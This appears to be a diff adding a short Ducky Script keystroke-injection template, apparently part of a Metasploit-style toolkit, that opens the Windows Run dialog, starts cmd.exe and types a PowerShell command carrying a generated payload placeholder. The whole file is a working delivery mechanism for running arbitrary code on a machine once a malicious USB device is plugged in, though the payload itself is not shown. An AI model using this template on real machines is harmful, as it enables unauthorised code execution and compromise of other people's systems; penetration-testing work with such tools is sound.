@@ -1,0 +1,14 @@
+REM Title: Metasploit Generated Payload
+REM Description: Opens a payload via powershell on the system
+REM Version: 1.0
+REM Open start menu
+REM We use cmd.exe since the powershell payload is likely too long for the run bar
+GUI r
+DELAY 750
+STRING cmd.exe
+DELAY 750
+ENTER
+DELAY 750
+STRING powershell.exe %{var_payload}
+DELAY 750
+ENTER
